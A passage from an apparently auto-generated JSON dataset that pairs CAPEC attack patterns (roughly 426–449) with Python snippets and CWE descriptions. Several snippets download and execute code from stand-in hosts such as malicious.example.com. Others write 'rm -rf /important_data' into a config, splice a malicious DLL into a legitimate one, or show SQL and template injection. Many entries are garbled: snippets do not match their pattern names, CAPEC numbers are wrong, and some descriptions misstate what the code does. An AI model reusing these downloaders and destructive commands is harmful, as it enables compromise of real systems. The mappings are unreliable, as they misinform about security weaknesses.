        "code_snippet": "import random\n\nclass User:\n    def __init__(self, username, balance):\n        self.username = username\n        self.balance = balance\n\n    def transfer_funds(self, amount, destination):\n        if self.balance >= amount:\n            self.balance -= amount\n            destination.balance += amount\n            print(f\"Transferred {amount} to {destination.username}\")\n        else:\n            print(\"Insufficient funds\")\n\nclass Adversary:\n    def __init__(self, target):\n        self.target = target\n\n    def incentivize(self):\n        # Simulate gathering information about the target's vulnerability\n        incentive = random.choice(['financial', 'social', 'ideological'])\n        print(f\"Using {incentive} incentive to influence {self.target.username}\")\n        if incentive == 'financial':\n            self.target.transfer_funds(100, self)\n        elif incentive == 'social':\n            print(f\"{self.target.username} is influenced by peer pressure\")\n        elif incentive == 'ideological':\n            print(f\"{self.target.username} is influenced by ideological beliefs\")\n\n# Example usage\nuser = User('victim', 150)\nadversary = Adversary(user)\nadversary.incentivize()",
        "description": "This Python code snippet demonstrates the concept of 'Influence via Incentives' by simulating an adversary who gathers information about a target's vulnerabilities and uses different types of incentives (financial, social, ideological) to influence the target's behavior. The User class represents a user with a balance, and the Adversary class represents an attacker who tries to manipulate the user. The transfer_funds method in the User class is vulnerable to financial manipulation, representing CWE-1229 (Creation of Emergent Resource) and CWE-405 (Asymmetric Resource Consumption). The incentivize method in the Adversary class simulates the process of influencing the user based on gathered information, highlighting the potential for exploitation."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import getpass\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-205: Observable Behavioral Discrepancy\n\n# Simulated user database\nusers = {'admin': 'password123'}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users and users[username] == password:\n        return True\n    return False\n\n# Function to simulate a reflection attack\ndef reflection_attack(target_username):\n    # Attacker uses the target's username to attempt authentication\n    attacker_username = target_username\n    attacker_password = getpass.getpass(prompt='Enter password for {}: '.format(attacker_username))\n    if authenticate(attacker_username, attacker_password):\n        print('Access granted to attacker!')\n    else:\n        print('Access denied to attacker.')\n\n# Main function\nif __name__ == '__main__':\n    target_username = 'admin'\n    reflection_attack(target_username)",
        "description": "This Python code snippet demonstrates a reflection attack on an authentication protocol, highlighting several security weaknesses. The `authenticate` function relies on a single factor (username and password) for authentication (CWE-654). The `reflection_attack` function simulates an attacker attempting to authenticate using the target's username, leveraging the same authentication mechanism (CWE-301). The use of `getpass` to prompt for a password can lead to observable behavioral discrepancies (CWE-205) if the system's response time or behavior changes based on the input. This code embodies the CAPEC idea of influencing behavior through understanding human interactions and exploiting security weaknesses."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef create_server(host, port):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind((host, port))\n    server_socket.listen(5)\n    print(f'Server listening on {host}:{port}')\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f'Connection from {addr}')\n        handle_client(client_socket)\n\n\ndef handle_client(client_socket):\n    try:\n        # CWE-222: Truncation of Security-relevant Information\n        data = client_socket.recv(1024).decode('utf-8')\n        print(f'Received data: {data[:50]}...')  # Truncate data for display\n\n        # CWE-1229: Creation of Emergent Resource\n        if 'create_resource' in data:\n            emergent_resource = open('emergent_resource.txt', 'w')\n            emergent_resource.write('This is an emergent resource.')\n            emergent_resource.close()\n            print('Emergent resource created.')\n\n        # CWE-301: Reflection Attack in an Authentication Protocol\n        if 'auth' in data:\n            client_socket.send(data.encode('utf-8'))  # Reflecting data back\n            print('Reflected data back to client.')\n\n    except Exception as e:\n        print(f'Error handling client: {e}')\n    finally:\n        client_socket.close()\n\n\nif __name__ == '__main__':\n    create_server('127.0.0.1', 65432)",
        "description": "This Python code snippet demonstrates a simple server that listens for incoming connections and handles client requests. The code embodies the main idea of CAPEC-112: 'Influence via Modes of Thinking' by showing how an adversary might manipulate communication channels and resources. The server does not properly verify the source of incoming requests (CWE-940) and allows the channel to be accessed by non-endpoints (CWE-300). It also demonstrates a reflection attack (CWE-301) by reflecting authentication data back to the client. Additionally, the code truncates security-relevant information (CWE-222) and creates an emergent resource (CWE-1229) based on client input. This setup can be exploited by an adversary to manipulate the target and gain unauthorized access or information."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import random\n\nclass EyeMovementTracker:\n    def __init__(self):\n        self.internal_state = random.choice(['secure', 'insecure'])\n\n    def track_eye_movement(self, eye_data):\n        if self.internal_state == 'secure':\n            return 'Tracking secure eye movement'\n        else:\n            return 'Tracking insecure eye movement'\n\n    def display_security_info(self):\n        if self.internal_state == 'secure':\n            return 'System is secure'\n        else:\n            return 'System is insecure'\n\n# Simulate eye movement tracking\ntracker = EyeMovementTracker()\neye_data = {'x': 100, 'y': 200}\nprint(tracker.track_eye_movement(eye_data))\nprint(tracker.display_security_info())",
        "description": "This Python code snippet simulates an eye movement tracking system that has an internal state which can be either 'secure' or 'insecure'. The `EyeMovementTracker` class has methods to track eye movements and display security information based on its internal state. The internal state is randomly set to 'secure' or 'insecure' upon initialization. The `track_eye_movement` method returns different messages based on the internal state, and the `display_security_info` method reveals the security status of the system. This code embodies the CAPEC idea of gaining information via non-verbal means (eye movements) and demonstrates related CWEs such as observable behavioral discrepancies (CWE-205, CWE-203) and UI misrepresentation of critical information (CWE-451). The internal state being observable through different responses can reveal security-relevant information to an unauthorized actor."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\nimport time\nimport random\n\n# Setup logging\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulate speculative execution vulnerability\nclass Processor:\n    def __init__(self):\n        self.secret_data = 'Sensitive Information'\n\n    def execute(self, condition):\n        if condition:\n            # Transient execution path\n            logging.debug(f'Transient execution with secret data: {self.secret_data}')\n        else:\n            # Correct execution path\n            logging.debug('Correct execution without secret data')\n\n# Simulate excessive attack surface\nclass Server:\n    def __init__(self):\n        self.processor = Processor()\n\n    def handle_request(self, user_input):\n        # Simulate a condition that could lead to speculative execution\n        condition = random.choice([True, False])\n        self.processor.execute(condition)\n\n# Simulate server handling multiple requests\nserver = Server()\nfor _ in range(10):\n    user_input = random.choice([True, False])\n    server.handle_request(user_input)\n    time.sleep(0.1)",
        "description": "This Python code snippet simulates a scenario where a server handles multiple requests, potentially exposing sensitive information through speculative execution vulnerabilities. The `Processor` class contains sensitive data and a method that logs this data during transient execution. The `Server` class simulates handling requests, which may trigger speculative execution paths. The logging setup writes debug information to a server log file, representing an excessive attack surface and potential information exposure. This code embodies the main idea of the deprecated CAPEC by demonstrating how microarchitectural state and speculative execution can lead to sensitive information exposure."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    if not validate_syntax(user_input):\n        error_message = f\"Error: Invalid input '{user_input}'\"\n        return render_template_string(f'<h1>{error_message}</h1>')\n    return 'Input is valid'\n\ndef validate_syntax(input_str):\n    # Placeholder for actual syntax validation logic\n    return True\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The main idea is to demonstrate improper validation of input syntax (CWE-1286) and improper neutralization of special elements in a template engine (CWE-1336). The `submit` function receives user input via a POST request and attempts to validate it. If the input is invalid, an error message containing the user input is generated and rendered using Flask's `render_template_string` function, which does not neutralize special characters, leading to potential script injection (CWE-81). Additionally, the error message may expose sensitive information (CWE-209). The application also has an excessive attack surface (CWE-1125) due to the lack of proper input validation and neutralization mechanisms."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import re\n\n# Simulate user input\nuser_input = \"' OR '1'='1\"\n\n# Vulnerable function that improperly neutralizes quoting syntax\n# and does not validate the syntactic correctness of input\n\ndef vulnerable_query(user_input):\n    query = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n    print(f\"Executing query: {query}\")\n    # Simulate query execution\n    if re.search(r\"' OR '1'='1\", query):\n        print(\"SQL Injection detected! All users returned.\")\n    else:\n        print(\"Query executed successfully.\")\n\n# Call the vulnerable function\nvulnerable_query(user_input)\n\n# Simulate a CAPTCHA that is easily guessable\ndef guessable_captcha():\n    captcha = \"1234\"  # Static CAPTCHA value\n    user_captcha_input = input(\"Enter CAPTCHA: \")\n    if user_captcha_input == captcha:\n        print(\"CAPTCHA passed.\")\n    else:\n        print(\"CAPTCHA failed.\")\n\n# Call the guessable CAPTCHA function\nguessable_captcha()",
        "description": "This Python code snippet demonstrates vulnerabilities related to the deprecated CAPEC 'Target Influence via Voice in NLP' and associated CWEs. The `vulnerable_query` function shows improper neutralization of quoting syntax (CWE-149) and improper validation of syntactic correctness of input (CWE-1286), leading to a potential SQL injection attack. The `guessable_captcha` function illustrates the use of a static, easily guessable CAPTCHA (CWE-804), which can be bypassed by non-human actors. These examples highlight the importance of proper input validation and secure CAPTCHA implementation."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-120: Buffer Copy without Checking Size of Input\n\ndef send_message(host, port, message):\n    try:\n        # Establish a connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n\n        # CWE-319: Sending sensitive information in cleartext\n        s.sendall(message.encode('utf-8'))\n\n        # CWE-924: No integrity check on the received message\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n\n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# CWE-120: Buffer Copy without Checking Size of Input\n# This function simulates a buffer overflow vulnerability\n\ndef vulnerable_buffer_copy(input_data):\n    buffer = bytearray(10)  # Small buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No size check, potential overflow\n    return buffer\n\n# Example usage\nhost = 'localhost'\nport = 12345\nmessage = 'Sensitive data'\n\nsend_message(host, port, message)\n\n# Simulate buffer overflow\ninput_data = bytearray(b'A' * 20)  # Input larger than buffer size\nvulnerable_buffer_copy(input_data)",
        "description": "This Python code snippet demonstrates the concept of 'Target Influence via The Human Buffer Overflow' by embedding messages within communication patterns. The `send_message` function establishes a socket connection and sends a message in cleartext (CWE-319), without ensuring message integrity (CWE-924). The `vulnerable_buffer_copy` function simulates a classic buffer overflow (CWE-120) by copying data into a buffer without checking the size, potentially leading to memory corruption. This code illustrates how improper handling of communication and buffer operations can lead to vulnerabilities, aligning with the CAPEC's idea of influencing targets through embedded messages."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\nclass SensitiveDataHandler:\n    def __init__(self):\n        self.sensitive_data = {'user1': 'password123', 'user2': 'qwerty'}\n        self.security_policy = {'admin': 'full_access', 'user': 'limited_access'}\n\n    def query_data(self, user_role, query):\n        if user_role not in self.security_policy:\n            return 'Access Denied'\n        if user_role == 'admin':\n            return self.sensitive_data\n        else:\n            # CWE-202: Exposure of Sensitive Information Through Data Queries\n            if 'password' in query:\n                return 'Sensitive information cannot be disclosed'\n            return {k: v for k, v in self.sensitive_data.items() if random.choice([True, False])}\n\n    def captcha_challenge(self):\n        # CWE-804: Guessable CAPTCHA\n        return '1234'  # A weak CAPTCHA that can be easily guessed\n\nhandler = SensitiveDataHandler()\nprint(handler.query_data('user', 'password'))  # Potentially exposes sensitive data\nprint(handler.captcha_challenge())  # Weak CAPTCHA",
        "description": "This Python code snippet demonstrates a class `SensitiveDataHandler` that handles sensitive data queries and includes a weak CAPTCHA challenge. The `query_data` method simulates a scenario where sensitive information might be exposed through data queries (CWE-202) by returning partial data based on a random choice, which can lead to information leakage. The `captcha_challenge` method returns a weak, easily guessable CAPTCHA (CWE-804). This code embodies the main idea of 'Target Influence via Interview and Interrogation' by showing how an attacker might infer sensitive information through data queries and exploit weak security measures like guessable CAPTCHAs."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# Vulnerable function to establish a communication channel\n\ndef establish_channel(destination):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((destination, 80))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {e}\")\n        return None\n\n# Function to handle incoming requests without proper verification\n\ndef handle_request(request):\n    if not verify_source(request):\n        print(\"Source verification failed!\")\n        return\n    # Process the request\n    print(\"Request processed\")\n\n# Dummy verification function\n\ndef verify_source(request):\n    # Improper verification logic\n    return True\n\n# Example usage\nchannel = establish_channel('malicious.example.com')\nif channel:\n    handle_request('fake_request')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of establishing and handling communication channels, embodying the main idea of 'Target Influence via Instant Rapport' and related CWEs. The 'establish_channel' function attempts to connect to a specified destination without verifying its legitimacy (CWE-941). The 'handle_request' function processes incoming requests without properly verifying their source (CWE-940). The 'verify_source' function contains a dummy verification logic that always returns True, representing improper verification. This code snippet highlights the risks of not adequately verifying communication channels and their sources, making the system susceptible to external influence and attacks."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n        self.firmware = self.load_firmware()\n\n    def load_firmware(self):\n        if not os.path.exists(self.firmware_path):\n            raise FileNotFoundError('Firmware file not found')\n        with open(self.firmware_path, 'rb') as f:\n            return f.read()\n\n    def check_integrity(self):\n        # Simulate integrity check (in reality, use cryptographic methods)\n        if b'MALICIOUS' in self.firmware:\n            raise ValueError('Firmware integrity check failed')\n\n    def run(self):\n        self.check_integrity()\n        print('Running device with firmware')\n\n# Simulate a compromised firmware file\nwith open('compromised_firmware.bin', 'wb') as f:\n    f.write(b'NORMAL_DATA\\x00MALICIOUS\\x00MORE_DATA')\n\n# Create a device with compromised firmware\ntry:\n    device = Device('compromised_firmware.bin')\n    device.run()\nexcept ValueError as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet simulates a scenario where a device's firmware has been compromised during the manufacturing process, embodying the main idea of CAPEC-Modification During Manufacture. The `Device` class loads firmware from a specified path and performs a basic integrity check to detect malicious modifications. The integrity check is simplified to look for the presence of the string 'MALICIOUS' in the firmware data. If the check fails, an error is raised, simulating the detection of a compromised component. The code also demonstrates the creation of a compromised firmware file and attempts to run the device with this firmware, resulting in an integrity check failure. This example highlights the risks associated with relying on insufficiently trustworthy components (CWE-1357), the importance of protecting confidential information (CWE-1297), and the need for thorough technical documentation and updateable components (CWE-1059, CWE-1329)."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a third-party library with known vulnerabilities\nresponse = requests.get('http://example.com/api/data')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Exposing sensitive information in the response\nif response.status_code == 200:\n    print(f'Sensitive Data: {response.text}')\n\n# CWE-1269: Product Released in Non-Release Configuration\n# Debug mode enabled in production\nDEBUG = True\nif DEBUG:\n    print('Debug mode is enabled. This should not be in production.')\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# Using an untrusted component for critical functionality\ntry:\n    import untrusted_component\n    untrusted_component.perform_critical_operation()\nexcept ImportError:\n    print('Failed to import untrusted component')\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Different behavior based on environment\nif 'PRODUCTION' in response.headers:\n    print('Running in production environment')\nelse:\n    print('Running in non-production environment')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It uses a third-party library with known vulnerabilities (CWE-1395), exposes sensitive information to unauthorized actors (CWE-200), runs in a non-release configuration with debug mode enabled (CWE-1269), relies on an insufficiently trustworthy component (CWE-1357), and exhibits observable behavioral discrepancies based on the environment (CWE-207). These issues highlight the risks of tampering and manipulation during the distribution of software products."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, version):\n        self.version = version\n        self.redundant_block = True\n        self.voltage_protection = True\n        self.clock_protection = True\n        self.security_version = version\n\n    def inject_error(self):\n        if random.choice([True, False]):\n            self.redundant_block = False\n            print('Error injected: Redundancy compromised.')\n        else:\n            print('Error injection failed.')\n\n    def glitch_voltage_clock(self):\n        self.voltage_protection = False\n        self.clock_protection = False\n        print('Voltage and clock glitch protection disabled.')\n\n    def downgrade_firmware(self, new_version):\n        if new_version < self.version:\n            self.security_version = new_version\n            print(f'Firmware downgraded to version {new_version}.')\n        else:\n            print('Downgrade failed: New version is not older.')\n\n# Simulate an attack\ncomponent = HardwareComponent(version=2.0)\ncomponent.inject_error()\ncomponent.glitch_voltage_clock()\ncomponent.downgrade_firmware(1.0)",
        "description": "This Python code snippet simulates a hardware integrity attack by exploiting various weaknesses described in the CAPEC and related CWEs. The `HardwareComponent` class represents a hardware component with attributes for redundancy, voltage and clock protection, and firmware version. The `inject_error` method simulates unauthorized error injection to compromise redundancy (CWE-1334). The `glitch_voltage_clock` method disables voltage and clock glitch protection (CWE-1247). The `downgrade_firmware` method allows downgrading the firmware to an older, potentially vulnerable version (CWE-1328). This code demonstrates how an adversary might exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-284: Improper Access Control\n\n# Malicious logic hidden in a seemingly benign function\nclass GreetingCard:\n    def __init__(self, message):\n        self.message = message\n\n    def display_message(self):\n        print(self.message)\n        self._install_malware()\n\n    def _install_malware(self):\n        # Malicious logic: create a hidden file and replicate itself\n        with open('hidden_malware.py', 'w') as f:\n            f.write(\"import os\\nimport sys\\n# Malicious code that replicates itself\\n\")\n        os.system('cp hidden_malware.py /tmp/hidden_malware.py')\n        # Improper access control: execute without user consent\n        os.system('python3 /tmp/hidden_malware.py')\n\n# Usage of the GreetingCard class\ncard = GreetingCard('Happy Birthday!')\ncard.display_message()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious logic within a seemingly benign class, `GreetingCard`. The class has a method `display_message` that prints a message but also calls a hidden method `_install_malware`. This hidden method creates a malicious script (`hidden_malware.py`) and replicates it to another location (`/tmp/hidden_malware.py`). It then executes the script without user consent, representing improper access control. This snippet embodies the CAPEC idea by showing how malicious logic can be inserted into a benign component, leveraging CWE-506 (Embedded Malicious Code), CWE-509 (Replicating Malicious Code), and CWE-284 (Improper Access Control)."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import requests\n\n# Benign function\ndef benign_function():\n    print('This is a benign function.')\n\n# Malicious function hidden within the benign code\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-494: Download of Code Without Integrity Check\n# CWE-508: Non-Replicating Malicious Code\n\ndef malicious_function():\n    url = 'http://malicious-website.com/malicious_code.py'\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download malicious code.')\n\n# Main function that calls the benign function\n# The malicious function is called without the user's knowledge\n\ndef main():\n    benign_function()\n    # Hidden call to the malicious function\n    malicious_function()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The code includes a benign function that appears harmless to the user. However, it also contains a hidden malicious function that downloads and executes code from a remote location without verifying its integrity (CWE-494). This malicious function is embedded within the benign code (CWE-506) and acts as a Trojan Horse (CWE-507), executing hidden malicious actions. The malicious code does not attempt to replicate itself (CWE-508), making it a non-replicating malicious code. The main function calls the benign function and secretly invokes the malicious function, embodying the idea of infected software that operates behind the scenes to achieve negative impacts."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport requests\n\nclass MaliciousModule:\n    def __init__(self):\n        self.url = 'http://malicious.example.com/malware.py'\n        self.local_path = '/tmp/malware.py'\n\n    def download_malicious_code(self):\n        response = requests.get(self.url)\n        if response.status_code == 200:\n            with open(self.local_path, 'wb') as file:\n                file.write(response.content)\n            self.execute_malicious_code()\n\n    def execute_malicious_code(self):\n        os.system(f'python {self.local_path}')\n\n# This would be called somewhere in the legitimate codebase\nmalicious_instance = MaliciousModule()\nmalicious_instance.download_malicious_code()",
        "description": "This Python code snippet represents a scenario where an authorized developer injects malicious logic into a codebase. The `MaliciousModule` class contains methods to download and execute malicious code from a remote server. The `download_malicious_code` method fetches the malicious script without verifying its integrity (CWE-494) and saves it locally. The `execute_malicious_code` method then runs the downloaded script. This snippet embodies the CAPEC idea of 'Malicious Logic Inserted Into Product by Authorized Developer' and demonstrates how an insider could exploit their position to introduce harmful functionality into a product."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# This function appears to be a legitimate feature but contains malicious code\n\ndef legitimate_function(data):\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    sensitive_info = os.getenv('SECRET_KEY')\n    print(f\"Processing data: {data}\")\n    # Malicious code: Exfiltrate sensitive information\n    with open('/tmp/exfiltrate.txt', 'w') as f:\n        f.write(sensitive_info)\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# This function dynamically executes code from an untrusted source\n\ndef execute_untrusted_code(untrusted_code):\n    exec(untrusted_code)\n\n# Example usage\nlegitimate_function('user input')\nexecute_untrusted_code('print(\"Executing untrusted code\")')",
        "description": "This Python code snippet demonstrates a scenario where an adversary has altered the development of a software product to include malicious functionality. The `legitimate_function` appears to be a normal function but contains embedded malicious code (CWE-506) that exfiltrates sensitive information (CWE-497) by writing an environment variable to a file. The `execute_untrusted_code` function improperly handles dynamically-managed code resources (CWE-913) by executing code from an untrusted source using the `exec` function. This code embodies the main idea of CAPEC-184 (Development Alteration) by showing how an adversary can insert malicious logic during development to achieve a negative impact when the system is deployed."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\ndef update_configuration(config_file):\n    with open(config_file, 'a') as f:\n        f.write('\\n# Malicious configuration change\\n')\n        f.write('os.system(\"rm -rf /important_data\")')\n\n# Simulate a configuration update\nupdate_configuration('config.txt')",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads a Python script from an untrusted source (CWE-494) and executes it without verifying its integrity (CWE-829). The downloaded script contains embedded malicious code (CWE-506) that modifies a configuration file to include a command that deletes important data. The code also shows improper control of dynamically-managed code resources (CWE-913) and could lead to unintended reentrant invocation of non-reentrant code (CWE-1265) if the malicious code is executed in a nested manner. This snippet highlights the risks associated with manipulating configuration management systems and the potential for introducing malicious logic into software products."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# Importing a third-party library from an untrusted source\ntry:\n    response = requests.get('http://untrusted-source.com/malicious-library.py')\n    with open('malicious-library.py', 'w') as file:\n        file.write(response.text)\nexcept Exception as e:\n    print(f'Failed to download the library: {e}')\n\n# CWE-506: Embedded Malicious Code\n# Executing the downloaded malicious code\ntry:\n    exec(open('malicious-library.py').read())\nexcept Exception as e:\n    print(f'Failed to execute the library: {e}')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# CWE-1103: Use of Platform-Dependent Third Party Components\n# The downloaded library may contain vulnerabilities, be unreliable, or not work across all platforms",
        "description": "This Python code snippet demonstrates the inclusion of a third-party component from an untrusted source, which is a common supply chain attack vector. The code attempts to download a Python script from an untrusted URL and then executes it. This represents CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-506 (Embedded Malicious Code). The downloaded component could be vulnerable (CWE-1395), unreliable (CWE-1357), or platform-dependent (CWE-1103), embodying the main idea of CAPEC-442: Malicious Logic Insertion into Product via Inclusion of Third-Party Component."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "class SecureSystem:\n    def __init__(self):\n        self._sensitive_data = 'Sensitive Information'\n        self._security_check_enabled = True\n\n    def access_sensitive_data(self, user_role):\n        # Design alteration: Security check is bypassed for 'admin' role\n        if user_role == 'admin' or self._security_check_enabled:\n            return self._sensitive_data\n        else:\n            raise PermissionError('Access Denied')\n\n# Example usage\nsystem = SecureSystem()\nprint(system.access_sensitive_data('admin'))  # Bypasses security check\nprint(system.access_sensitive_data('user'))   # Raises PermissionError",
        "description": "This Python code snippet represents a design alteration attack where the security check is bypassed for users with the 'admin' role. The `SecureSystem` class contains a method `access_sensitive_data` that is supposed to protect access to sensitive information. However, due to a design flaw, the security check is bypassed for 'admin' users, which could be exploited by an adversary. This embodies the main idea of CAPEC-Design Alteration, where the design is modified to introduce vulnerabilities. The related CWEs are represented by the exposure of sensitive information (CWE-497) and the violation of secure design principles (CWE-657)."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-426: Untrusted Search Path\n# CWE-1102: Reliance on Machine-Dependent Data Representation\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n\n# Path to the legitimate DLL\nlegit_dll_path = 'C:\\path\\to\\legit.dll'\n\n# Path to the malicious DLL\nmalicious_dll_path = 'C:\\path\\to\\malicious.dll'\n\n# Load the legitimate DLL\nlegit_dll = ctypes.CDLL(legit_dll_path)\n\n# Function to embed malicious code into the legitimate DLL\ndef embed_malicious_code(legit_dll_path, malicious_dll_path):\n    with open(legit_dll_path, 'rb') as legit_file:\n        legit_data = legit_file.read()\n    with open(malicious_dll_path, 'rb') as malicious_file:\n        malicious_data = malicious_file.read()\n    # Embed malicious code into the gaps of the legitimate DLL\n    embedded_data = legit_data[:100] + malicious_data + legit_data[100:]\n    with open(legit_dll_path, 'wb') as legit_file:\n        legit_file.write(embedded_data)\n\n# Embed the malicious code\nembed_malicious_code(legit_dll_path, malicious_dll_path)\n\n# Load the tampered DLL\ntampered_dll = ctypes.CDLL(legit_dll_path)\n\n# Function to simulate malicious behavior\n# This could be data exfiltration, eavesdropping, etc.\ndef malicious_behavior():\n    sensitive_info = os.popen('whoami').read()\n    print(f'Sensitive Information: {sensitive_info}')\n\n# Execute the malicious behavior\nmalicious_behavior()",
        "description": "This Python code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code first loads a legitimate DLL and then embeds malicious code into it by reading both the legitimate and malicious DLLs, combining their data, and writing the combined data back to the legitimate DLL. The tampered DLL is then loaded, and a function simulating malicious behavior (e.g., data exfiltration) is executed. This example incorporates several CWEs: CWE-426 (Untrusted Search Path) by loading DLLs from potentially unsafe paths, CWE-1102 (Reliance on Machine-Dependent Data Representation) by manipulating binary data, CWE-497 (Exposure of Sensitive System Information) by accessing system information, CWE-506 (Embedded Malicious Code) by embedding malicious code, and CWE-509 (Replicating Malicious Code) by simulating a virus-like behavior."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\n\ndef handle_user_input(file_path):\n    # CWE-67: Improper Handling of Windows Device Names\n    if any(device in file_path for device in ['AUX', 'CON', 'NUL', 'PRN', 'COM1', 'LPT1']):\n        raise ValueError('Invalid file path containing Windows device name.')\n\n    # CWE-506: Embedded Malicious Code\n    # Simulating a benign function that hides malicious behavior\n    def benign_function():\n        print('This is a benign function.')\n        # Hidden malicious code\n        os.system('echo Malicious code executed')\n\n    benign_function()\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    import non_existent_module\nexcept ImportError:\n    print('Non-ubiquitous API call failed.')\n\n# CWE-1277: Firmware Not Updateable\nclass DeviceFirmware:\n    def __init__(self, version):\n        self.version = version\n        self.updateable = False\n\n    def update_firmware(self, new_version):\n        if self.updateable:\n            self.version = new_version\n        else:\n            print('Firmware not updateable.')\n\n# Example usage\nhandle_user_input('example.txt')\ndevice = DeviceFirmware('1.0')\ndevice.update_firmware('1.1')",
